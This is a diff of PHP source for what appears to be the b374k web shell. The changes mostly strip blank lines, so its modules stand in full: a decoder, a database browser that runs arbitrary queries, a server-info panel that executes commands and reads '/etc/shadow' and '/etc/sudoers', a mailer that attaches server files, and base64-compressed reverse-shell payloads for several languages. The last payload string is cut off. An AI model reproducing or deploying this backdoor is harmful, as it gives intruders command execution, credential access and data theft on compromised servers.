 		$res .= decode_line("sha1", sha1($str), "input");
-
 		$res .= decode_line("base64 encode", base64_encode($str), "textarea");
 		$res .= decode_line("base64 decode", base64_decode($str), "textarea");
-
-
 		$res .= decode_line("hex to string", @pack("H*" , $str), "textarea");
 		$res .= decode_line("string to hex", bin2hex($str), "textarea");
-
 		$ascii = "";
 		for($i=0; $i<$length; $i++){
 			$ascii .= ord(substr($str,$i,1))." ";
 		}
 		$res .= decode_line("ascii char", trim($ascii), "textarea");
-
 		$res .= decode_line("reversed", strrev($str), "textarea");
 		$res .= decode_line("lowercase", strtolower($str), "textarea");
 		$res .= decode_line("uppercase", strtoupper($str), "textarea");
-
 		$res .= decode_line("urlencode", urlencode($str), "textarea");
 		$res .= decode_line("urldecode", urldecode($str), "textarea");
 		$res .= decode_line("rawurlencode", rawurlencode($str), "textarea");
 		$res .= decode_line("rawurldecode", rawurldecode($str), "textarea");
-
 		$res .= decode_line("htmlentities", html_safe($str), "textarea");
-
 		if(function_exists('hash_algos')){
 			$algos = hash_algos();
 			foreach($algos as $algo){
@@ -1463,11 +1341,9 @@ if(!function_exists('decode')){
 				$res .= decode_line($algo, hash($algo, $str), "input");
 			}
 		}
-
 		return $res;
 	}
 }
-
 if(!function_exists('decode_line')){
 	function decode_line($type, $result, $inputtype){
 		$res = "<tr><td class='colFit'>".$type."</td><td>";
@@ -1480,7 +1356,6 @@ if(!function_exists('decode_line')){
 		return $res;
 	}
 }
-
 if(isset($p['decodeStr'])){
 	$decodeStr = $p['decodeStr'];
 	output(decode($decodeStr));
@@ -1523,7 +1398,6 @@ $GLOBALS['module']['database']['content'] = "
 <table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
 </div>
 ";
-
 if(!function_exists('sql_connect')){
 	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
 		if($sqltype == 'mysql'){
@@ -1559,7 +1433,6 @@ if(!function_exists('sql_connect')){
 		return false;
 	}
 }
-
 if(!function_exists('sql_query')){
 	function sql_query($sqltype, $query, $con){
 		if($sqltype == 'mysql'){
@@ -1578,7 +1451,6 @@ if(!function_exists('sql_query')){
 		elseif($sqltype == 'pdo') return $con->query($query);
 	}
 }
-
 if(!function_exists('sql_num_rows')){
 	function sql_num_rows($sqltype,$result){
 		if($sqltype == 'mysql'){
@@ -1600,7 +1472,6 @@ if(!function_exists('sql_num_rows')){
 		elseif($sqltype == 'pdo') return $result->rowCount();
 	}
 }
-
 if(!function_exists('sql_num_fields')){
 	function sql_num_fields($sqltype, $result){
 		if($sqltype == 'mysql'){
@@ -1619,7 +1490,6 @@ if(!function_exists('sql_num_fields')){
 		elseif($sqltype == 'pdo') return $result->columnCount();
 	}
 }
-
 if(!function_exists('sql_field_name')){
 	function sql_field_name($sqltype,$result,$i){
 		if($sqltype == 'mysql'){
@@ -1647,7 +1517,6 @@ if(!function_exists('sql_field_name')){
 		}
 	}
 }
-
 if(!function_exists('sql_fetch_data')){
 	function sql_fetch_data($sqltype,$result){
 		if($sqltype == 'mysql'){
@@ -1666,7 +1535,6 @@ if(!function_exists('sql_fetch_data')){
 		elseif($sqltype == 'pdo') return $result->fetch(2);
 	}
 }
-
 if(!function_exists('sql_close')){
 	function sql_close($sqltype,$con){
 		if($sqltype == 'mysql'){
@@ -1685,11 +1553,9 @@ if(!function_exists('sql_close')){
 		elseif($sqltype == 'pdo') return $con = null;
 	}
 }
-
 if(!function_exists('sql_get_supported')){
 	function sql_get_supported(){
 		$db_supported = array();
-
 		if(function_exists("mysql_connect")) $db_supported[] = 'mysql';
 		if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $db_supported[] = 'mssql';
 		if(function_exists("pg_connect")) $db_supported[] = 'pgsql';
@@ -1698,11 +1564,9 @@ if(!function_exists('sql_get_supported')){
 		if(class_exists("SQLite3")) $db_supported[] = 'sqlite3';
 		if(function_exists("odbc_connect")) $db_supported[] = 'odbc';
 		if(class_exists("PDO")) $db_supported[] = 'pdo';
-
 		return implode(",", $db_supported);
 	}
 }
-
 if(isset($p['dbGetSupported'])){
 	$res = sql_get_supported();
 	if(empty($res)) $res = "error";
@@ -1714,10 +1578,8 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 	$user = $p['dbUser'];
 	$pass = $p['dbPass'];
 	$port = $p['dbPort'];
-
 	$con = sql_connect($type ,$host , $user , $pass);
 	$res = "";
-
 	if($con!==false){
 		if(isset($p['dbQuery'])){
 			$query = $p['dbQuery'];
@@ -1727,7 +1589,6 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 				$table = trim($p['dbTable']);
 				$start = (int) (isset($p['dbStart']))? trim($p['dbStart']):0;
 				$limit = (int) (isset($p['dbLimit']))? trim($p['dbLimit']):100;
-
 				if($type=='mysql'){
 					$query = "SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$limit.";";
 				}
@@ -1745,7 +1606,6 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 					$query = "SELECT * FROM ".$table." LIMIT ".$start.",".$limit.";";
 				}
 				else $query = "";
-
 				$pagination = "Limit <input type='text' id='dbLimit' value='".html_safe($limit)."' style='width:50px;'>
 								<span class='button' onclick=\"db_pagination('prev');\">prev</span>
 								<span class='button' onclick=\"db_pagination('next');\">next</span>
@@ -1754,7 +1614,6 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 								<input type='hidden' id='dbStart' value='".html_safe($start)."'>
 								";
 			}
-
 			$querys = explode(";", $query);
 			foreach($querys as $query){
 				if(trim($query) != ""){
@@ -1794,9 +1653,7 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 				elseif($type=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
 				elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = "SELECT \"".$host."\"";
 				else $showdb = "SHOW DATABASES";
-
 				$query_db = sql_query($type, $showdb, $con);
-
 				if($query_db!=false) {
 					while($db_arr = sql_fetch_data($type, $query_db)){
 						foreach($db_arr as $db){
@@ -1806,10 +1663,8 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 							elseif($type=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$db."'";
 							elseif(($type=='sqlite3') || ($type=='sqlite')) $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
 							else $showtbl = "";
-
 							$res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>".$db."</p><table class='border' style='display:none;margin:8px 0;'>";
 							$query_table = sql_query($type, $showtbl, $con);
-
 							if($query_table!=false){
 								while($tables_arr = sql_fetch_data($type, $query_table)){
 									foreach($tables_arr as $table) $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>".$table."</td></tr>";
@@ -1825,19 +1680,16 @@ elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['
 	if(!empty($res)) output($res);
 	output('error');
 }
-
 $GLOBALS['module']['info']['id'] = "info";
 $GLOBALS['module']['info']['title'] = "Info";
 $GLOBALS['module']['info']['js_ontabselected'] = "";
 $GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>";
-
 if(!function_exists('info_getinfo')){
 	function info_getinfo(){
 		$res = "";
 		// server misc info
 		$res .= "<p class='boxtitle' onclick=\"info_toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>";
 		$res .= "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
-
 		if(is_win()){
 			foreach (range("A", "Z") as $letter){
 				if(is_readable($letter.":\\")){
@@ -1847,7 +1699,6 @@ if(!function_exists('info_getinfo')){
 			}
 		}
 		else $res .= "<tr><td>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>";
-
 		$res .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
 		$access = array("python"=>"python -V",
 						"perl"=>"perl -e \"print \$]\"",
@@ -1859,16 +1710,13 @@ if(!function_exists('info_getinfo')){
 						"java"=>"java -version",
 						"javac"=>"javac -version"
 						);
-
 		foreach($access as $k=>$v){
 			$version = execute($v);
 			$version = explode("\n", $version);
 			if($version[0]) $version = $version[0];
 			else $version = "?";
-
 			$res .= "<tr><td>".$k."</td><td>".$version."</td></tr>";
 		}
-
 		if(!is_win()){
 			$interesting = array(
 			"/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
@@ -1883,7 +1731,6 @@ if(!function_exists('info_getinfo')){
 			}
 		}
 		$res .= "</table></div>";
-
 		if(!is_win()){
 			// cpu info
 			if($i_buff=trim(read_file("/proc/cpuinfo"))){
@@ -1907,7 +1754,6 @@ if(!function_exists('info_getinfo')){
 				}
 				$res .= "</div>";
 			}
-
 			// mem info
 			if($i_buff=trim(read_file("/proc/meminfo"))){
 				$res .= "<p class='boxtitle' onclick=\"info_toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>";
@@ -1923,7 +1769,6 @@ if(!function_exists('info_getinfo')){
 				}
 				$res .= "</table></div>";
 			}
-
 			// partition
 			if($i_buff=trim(read_file("/proc/partitions"))){
 				$i_buff = preg_replace("/\ +/", " ", $i_buff);
@@ -1958,20 +1803,16 @@ if(!function_exists('info_getinfo')){
 				$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
 				$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body);
 				$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body);
-
 				$res .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>";
 			}
 		}
-
 		$res .= "<span class='button colSpan' onclick=\"info_refresh();\" style='margin-bottom:8px;'>refresh</span><div style='clear:both;'></div>";
 		return $res;
 	}
 }
-
 if(isset($p['infoRefresh'])){
 	output(info_getinfo());
 }
-
 $GLOBALS['module']['mail']['id'] = "mail";
 $GLOBALS['module']['mail']['title'] = "Mail";
 $GLOBALS['module']['mail']['js_ontabselected'] = "if(!portableMode) $('#mailFrom').focus();";
@@ -1996,18 +1837,14 @@ $GLOBALS['module']['mail']['content'] = "
 </tfoot>
 </table>
 ";
-
 if(!function_exists('send_email')){
 	function send_email($from, $to, $subject, $msg, $attachment){
 		$headers = "MIME-Version: 1.0\r\n".$from;
-
 		$rand = md5(time());
 		$headers .= "Content-Type: multipart/mixed; boundary=\"".$rand."\"\r\n\r\n";
-
 		$headers .= "--".$rand."\r\n";
 		$headers .= "Content-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
 		$headers .= $msg."\r\n\r\n";
-
 		if(count($attachment)>0){
 			foreach($attachment as $file){
 				if(is_file($file)){
@@ -2025,7 +1862,6 @@ if(!function_exists('send_email')){
 		return false;
 	}
 }
-
 if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){
 	$mailFrom = trim($p['mailFrom']);
 	$mailTo = trim($p['mailTo']);
@@ -2033,27 +1869,22 @@ if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($
 	$mailContent = trim($p['mailContent']);
 	$mailAttachment = trim($p['mailAttachment']);
 	$mailAttachment = (!empty($mailAttachment))? explode("{[|b374k|]}", $p['mailAttachment']):array();
-
 	if(empty($mailTo)) output("Please specify at least one recipient");
 	if(!empty($mailFrom)){
 		$mailFrom = "From: ".$mailFrom."\r\nReply-To: ".$mailFrom."\r\n";
 	}
-
 	foreach($mailAttachment as $file){
 		$file = trim($file);
 		if(empty($file)) continue;
 		if(!is_file($file)) output("No such file : ".$file);
 	}
-
 	if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($mailTo));
 	output("Failed to send mail");
 }
-
 $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"";
 $remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
 $default_port = 13123;
 $winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":"";
-
 $GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G";
 $GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc=";
 $GLOBALS['resources']['rs_perl'] = "lZJhb9MwEIY/17/CZF6bSIG0DAmpJhVVmqFqa1PFHQhRiNL0WKylcRS7rKgrvx0ny2gEQoJ8sO5en56zHuXsmbOTpbPmuQP5N1xAmaEznCpVyKHj3HKV7tYvErF11hevX909nmgnAU+D4ZCJ5A4URURIl3wJdCFT14B9IUqFl344c/cKyi1dsIHbW5HFh8lq1KPNvQ5pvVem+Dk3KOJfzQr0Y+vc65Rbh5p27gUztvC9c+xcGfSIiHJvQRWlUGL9PY+3YPZUUvQsimT9GpPZ3cVlNJ37S7vLAu8qYsvQH89soqyHhw0H06pXvR2H79677sA6oA4pXFK1n/qfKepIUBVKFBWLBddRRdE0FkShf8P88WQS2gNN6ejXb/RMNR1vNmXEc5MU9nReTUTj+UfrtLGTcakg19MXrTBOEtBrPJtZ9WKN82yjloxlClmGhzgReQ6Jgs0qN+x+NScKyDFbTqZz23jT9Qz6FAQ3S9sYtRM/DJsEdWAPCdZOT+uTTEgwPYs+FuxXUbFbjea2Os20ahxXuE8ROiLI5Mnoyz+NkrTpBnXHXZ6DimIltK+0pYPE7m8uCW9dNya0QxK34lob+zdtZqNt1GWGRZ+Sxls7asRV0d/N/ZewWhMcKm2m/nuOSH8/AQ==";
@@ -2062,7 +1893,6 @@ $GLOBALS['resources']['rs_node'] = "nVHLbsIwEDwbiX+IcokjIVsqSJVAnPoJPdKHjLNgq46T
 $GLOBALS['resources']['rs_gcc'] = "rVJhb9owEP0Mv8JjU+tQj5C006TSVEKFSWgtRMA0TRuKgmPIqcGOYjNBp/732nFgwLRJk/ohyd27l3f2vXObKFUql9euuwSVructKlbu/PLj1aN9o6ZbfwucZuuEoRupEhCt9PYIKoAvT7Ekg/kJtpWu2uZM/glLQR+ZOsY5U6AfF/gxvuag1Q0GXKFVDBybIC6WlNA0LlBThz+/z5xf9ZopSEKJCLxOvaYPuqYa0M3iJCki4Ag0DAtsfg4C3/xSg5YEHi3iFWTboPspGgz7084ez0WhglQJLnGsBOCylzdznN8Uo92S5adkZngw7PZ646g7/FbSZGDviyt1MhndfY4m03G/+0DalsKU4YhcYanL95GhlMxo3P8y6Rs9ciaIhCcmFlhU/Rf4jXTYBhS2MnPgiRbAJzdHTecMSHvjWVamB8q45n0oUxrElLKyc3t/HK1DScMuhExZlqFrRAXnjCqW/OAN4l9V3GSd+5p7lHiHiW8lt7rpCjfYxowUTfvjh2CjWLHqhBMvOH8Xfu3dnneqqoZ0yChy9Y1cmaL30LBnzYRkmJr4uV5jmWRob+fl69tpFrKMLNGf2Sk/sULsEKJnnelp7ggX3sUhstP+5w4MwnA8mo6i6V248xVXw/6rm9UmnNQcx7lpH25E6aT8DyflceIdJq/vpLROPtdfAA==";
 $GLOBALS['resources']['rs_java'] = "lVRNb9swDD2nQP+D4JM9BHaTDdjWIsOwYYcBAzosvXXBICuMrdWWBYnOB9L891Gy7LhrLz1Ekcgn8vGRcpaxElHb6ywrJJZtnoqmzvK37989dOvlhax1Y5D95VueyiZ9c/PUpAC97fJCt3klBRMVt5b5y3+MPV5eTLSRW47ALHIkwEYqXgWYRgZ7BLW27K40wNcOP1z4rnSLSyR7zaS9GbtuWzz7mhY9A3J3HDTGT+9On11IjlhKm0q7oMh+S8aFi3TqQn2+3YIxcg2juNtGrplpVZx4nhM0h24zyQ8I9yuWswVTsGP++GH2cb666fxSIRPkpDyuzDhPgmNXygpi8WlxlbAQa0Is0p2RCHE+vZqKHurtm6q1ZTyYXox58n/dKjiKMv62F6BRNopBcoSUVFSkBRcPd4YLoHAe7Jau+lBv6Jgvu+ZSxaSfVAUVyk1hOxFcZW4cfO7Oz0S9Jl5RlkuV2TLyLrmJlweLUKcF4E/TaDB4iKPGporXECUpNj+aHZiv3BKhVKo17G83cbSTKkqcPMcQlf6ijm/ItnNWP3DMllBV7JqJRikQCOvfqss+6s/OEfhCZxtkXDbiAZCVoXfdMfiGDhN9V3NagSqwXCxmYQQm/iksaFYRCjCp5sYCHTz6/mrV92QJhuYppLJ9qpExdoF6tONiUy5c1/pmd/2EygL7n8z8tWQ64aQmrHfNVqPEIxGknrIRr9PLUrDHR/Yyn/ErLKQru3Tqj8zDKD95oEUzYMf2AUz+/oX0JhopAe6TQhd/tQplDe562NJEwR5ETMOThG8FqUWTOwsFk876GbWpI9IncOj5GV24r4p+znCAz1J6Psa1T8+H7VlGv7ziddLv9A8=";
 $GLOBALS['resources']['rs_executable'] = "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